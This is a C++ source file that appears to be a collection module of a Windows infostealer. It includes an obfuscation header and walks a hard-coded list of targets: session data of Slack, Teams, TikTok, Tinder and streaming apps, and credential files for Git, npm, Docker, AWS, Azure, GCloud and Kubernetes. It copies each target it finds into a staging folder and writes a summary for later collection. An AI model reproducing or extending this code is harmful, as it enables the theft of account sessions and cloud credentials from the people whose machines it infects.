// Social / collaboration apps: Slack, Teams, TikTok, Instagram, Tinder, Netflix.
#include "../modules.h"
#include "../config.h"
#include "../core/obf.h"
#include "../core/sys.h"
#include <sstream>

namespace {

struct SocTarget { const char* name; const char* path; const char* pattern; };

const SocTarget k_socials[] = {
    {"Slack", "%APPDATA%\\Slack\\Local Storage", "*"},
    {"Slack cookies", "%APPDATA%\\Slack\\Cookies", "*"},
    {"Slack config", "%APPDATA%\\Slack", "storage.json"},
    {"Teams", "%APPDATA%\\Microsoft\\Teams\\Local Storage", "*"},
    {"Teams (new)", "%LOCALAPPDATA%\\Packages\\MSTeams_8wekyb3d8bbwe\\LocalCache\\Microsoft\\MSTeams", "*"},
    {"TikTok", "%APPDATA%\\TikTok", "*"},
    {"TikTok live", "%APPDATA%\\TikTokLiveStudio", "*"},
    {"Instagram", "%APPDATA%\\Instagram", "*"},
    {"Twitter", "%APPDATA%\\Twitter", "*"},
    {"Tinder", "%APPDATA%\\Tinder", "*"},
    {"Netflix", "%APPDATA%\\Netflix", "*"},
    {"Spotify", "%APPDATA%\\Spotify", "*.json"},
    {"Spotify local", "%LOCALAPPDATA%\\Spotify", "*"},
    {"Amazon Music", "%APPDATA%\\Amazon Music", "*"},
    {"Tidal", "%APPDATA%\\TIDAL", "*"},
    {"Deezer", "%APPDATA%\\Deezer", "*"},
    {"OBS", "%APPDATA%\\obs-studio\\plugin_config", "*"},
    {"OBS profiles", "%APPDATA%\\obs-studio\\basic\\profiles", "*"},
    {"Streamlabs", "%APPDATA%\\Streamlabs", "*"},
    {"Plex", "%LOCALAPPDATA%\\Plex", "*"},
    {"Steam chat", "%LOCALAPPDATA%\\Steam\\htmlcache", "Local Storage"},
    {"MS Store accounts", "%LOCALAPPDATA%\\Microsoft\\OneAuth", "*"},
    {"Xbox", "%LOCALAPPDATA%\\Packages\\Microsoft.XboxApp_8wekyb3d8bbwe\\LocalState", "*"},
    {"GitHub desktop", "%APPDATA%\\GitHub Desktop", "*"},
    {"Git config", "%USERPROFILE%\\.gitconfig", "*"},
    {"Git credentials", "%USERPROFILE%\\.git-credentials", "*"},
    {"NPM tokens", "%USERPROFILE%\\.npmrc", "*"},
    {"Docker config", "%USERPROFILE%\\.docker\\config.json", "*"},
    {"AWS", "%USERPROFILE%\\.aws", "*"},
    {"GCloud", "%APPDATA%\\gcloud", "*"},
    {"Azure CLI", "%USERPROFILE%\\.azure", "*"},
    {"Kube config", "%USERPROFILE%\\.kube\\config", "*"},
    {"Terraform", "%USERPROFILE%\\.terraformrc", "*"},
    {"Postman", "%APPDATA%\\Postman", "*.json"},
    {"Insomnia", "%APPDATA%\\Insomnia", "*"},
};

} // namespace

namespace mod {

void socials(const std::string& staging) {
    std::ostringstream summary;
    int hits = 0;
    for (auto& s : k_socials) {
        std::string path = util::expand_env(s.path);
        if (path.empty() || !util::path_exists(path)) continue;
        hits++;
        if (util::is_dir(path)) {
            util::copy_dir_recursive(path, util::join(staging, "socials\\" + std::string(s.name)),
                                     {s.pattern}, 16 * 1024 * 1024);
        } else {
            std::vector<uint8_t> data;
            if (util::read_file(path, data) && data.size() < cfg::MAX_GRAB_FILE)
                stage::stage_bytes("socials", util::replace_all(std::string(s.name), " ", "_") + "_" + util::filename_of(path), data);
        }
        summary << "  " << s.name << ": " << path << "\r\n";
    }
    stage::stage_text("socials", "_summary.txt", summary.str());
    stage::note("socials", std::to_string(hits) + " targets collected");
}

} // namespace mod
